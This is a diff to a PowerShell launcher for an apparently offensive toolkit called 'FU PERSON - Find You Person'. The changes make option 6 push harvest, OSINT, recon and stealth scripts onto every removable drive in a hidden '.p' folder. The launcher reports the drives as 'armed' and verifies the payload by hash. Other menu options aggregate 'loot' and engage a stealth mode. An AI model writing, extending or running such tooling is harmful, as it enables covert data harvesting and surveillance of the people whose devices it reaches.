@@ -1,4 +1,4 @@
-<# ═══════════════════════════════════════════════════════════════════════
+﻿<# ═══════════════════════════════════════════════════════════════════════
    FLLC | FU PERSON | MASTER LAUNCHER v2.0
    ╔══════════════════════════════════════════════════════════════════╗
    ║  Five devices. One platform. Total operational control.          ║
@@ -23,8 +23,8 @@ function Show-Banner {
 "@
     Write-Host $banner -ForegroundColor Cyan
     Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor DarkCyan
-    Write-Host "    ║  FLLC Operations Platform v$version                          ║" -ForegroundColor DarkCyan
-    Write-Host "    ║  Pure PowerShell | Zero Dependencies                     ║" -ForegroundColor DarkCyan
+    Write-Host "    ║  FU PERSON - Find You Person - v$version                      ║" -ForegroundColor DarkCyan
+    Write-Host "    ║  FLLC Operations | Pure PowerShell | Zero Dependencies   ║" -ForegroundColor DarkCyan
     Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor DarkCyan
 }
 
@@ -169,7 +169,7 @@ function Show-Menu {
                 Read-Host "`n    Press Enter to continue"
             }
             "5" {
-                Write-Host "`n    [*] DEVICE SYNC — Aggregating loot from all devices..." -ForegroundColor Cyan
+                Write-Host "`n    [*] DEVICE SYNC - Aggregating loot from all devices..." -ForegroundColor Cyan
                 $syncPath = Join-Path $scriptDir "device_sync.ps1"
                 if (Test-Path $syncPath) {
                     . $syncPath
@@ -180,27 +180,69 @@ function Show-Menu {
                 Read-Host "`n    Press Enter to continue"
             }
             "6" {
-                Write-Host "`n    [*] DEPLOY ALL — Pushing payloads to connected devices..." -ForegroundColor Cyan
+                Write-Host "`n    [*] DEPLOY ALL - Pushing payloads to connected devices..." -ForegroundColor Cyan
+                $requiredScripts = @("harvest.ps1","osint.ps1","recon.ps1","launcher.ps1","device_sync.ps1","stealth_mode.ps1","report_generator.ps1")
+                
+                # Pre-flight: verify all scripts exist on source
+                Write-Host "    [*] Pre-flight check..." -ForegroundColor DarkGray
+                $missingScripts = @()
+                foreach ($script in $requiredScripts) {
+                    $src = Join-Path $scriptDir $script
+                    if (-not (Test-Path $src)) { $missingScripts += $script }
+                }
+                if ($missingScripts.Count -gt 0) {
+                    Write-Host "    [!] Missing source scripts: $($missingScripts -join ', ')" -ForegroundColor Red
+                    Write-Host "    [!] Deploy aborted. Ensure all scripts are in: $scriptDir" -ForegroundColor Red
+                    Read-Host "`n    Press Enter to continue"
+                    continue
+                }
+                Write-Host "    [+] All $($requiredScripts.Count) scripts verified" -ForegroundColor Green
+
                 $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2" 2>$null
+                $deployCount = 0
                 foreach ($drive in $drives) {
                     $targetP = Join-Path $drive.DeviceID ".p"
                     if (-not (Test-Path $targetP)) {
                         New-Item -ItemType Directory -Path $targetP -Force | Out-Null
                     }
-                    $scripts = @("harvest.ps1","osint.ps1","recon.ps1","device_sync.ps1","stealth_mode.ps1","report_generator.ps1")
-                    foreach ($script in $scripts) {
+                    $driveDeployed = 0
+                    foreach ($script in $requiredScripts) {
                         $src = Join-Path $scriptDir $script
-                        if (Test-Path $src) {
-                            Copy-Item $src -Destination $targetP -Force
-                            Write-Host "    [+] Deployed $script to $($drive.DeviceID)" -ForegroundColor Green
+                        try {
+                            Copy-Item $src -Destination $targetP -Force -ErrorAction Stop
+                            $driveDeployed++
+                        } catch {
+                            Write-Host "    [!] Failed: $script -> $($drive.DeviceID): $($_.Exception.Message)" -ForegroundColor Red
+                        }
+                    }
+                    # Set hidden attribute on payload directory
+                    attrib +h "$targetP" 2>$null
+                    Write-Host "    [+] Deployed $driveDeployed/$($requiredScripts.Count) scripts to $($drive.DeviceID)" -ForegroundColor Green
+                    $deployCount++
+                }
+
+                if ($deployCount -eq 0) {
+                    Write-Host "    [!] No removable drives detected. Insert USB and retry." -ForegroundColor Red
+                } else {
+                    Write-Host "    [+] Payload deployment complete: $deployCount drive(s) armed." -ForegroundColor Green
+                    # Verify deployment integrity via spot-check
+                    foreach ($drive in $drives) {
+                        $checkFile = Join-Path (Join-Path $drive.DeviceID ".p") "harvest.ps1"
+                        if (Test-Path $checkFile) {
+                            $srcHash = (Get-FileHash (Join-Path $scriptDir "harvest.ps1") -Algorithm SHA256).Hash
+                            $dstHash = (Get-FileHash $checkFile -Algorithm SHA256).Hash
+                            if ($srcHash -eq $dstHash) {
+                                Write-Host "    [+] Integrity check PASSED for $($drive.DeviceID)" -ForegroundColor Green
+                            } else {
+                                Write-Host "    [!] Integrity check FAILED for $($drive.DeviceID) - re-deploy recommended" -ForegroundColor Red
+                            }
                         }
                     }
                 }
-                Write-Host "    [+] Payload deployment complete." -ForegroundColor Green
                 Read-Host "`n    Press Enter to continue"
             }
             "7" {
-                Write-Host "`n    [*] STEALTH MODE — Engaging ultra-quiet operation..." -ForegroundColor Cyan
+                Write-Host "`n    [*] STEALTH MODE - Engaging ultra-quiet operation..." -ForegroundColor Cyan
                 $stealthPath = Join-Path $scriptDir "stealth_mode.ps1"
                 if (Test-Path $stealthPath) {
                     . $stealthPath
@@ -211,7 +253,7 @@ function Show-Menu {
                 Read-Host "`n    Press Enter to continue"
             }
             "8" {
-                Write-Host "`n    [*] REPORT GENERATOR — Aggregating all loot..." -ForegroundColor Cyan
+                Write-Host "`n    [*] REPORT GENERATOR - Aggregating all loot..." -ForegroundColor Cyan
                 $reportPath = Join-Path $scriptDir "report_generator.ps1"
                 if (Test-Path $reportPath) {
                     . $reportPath
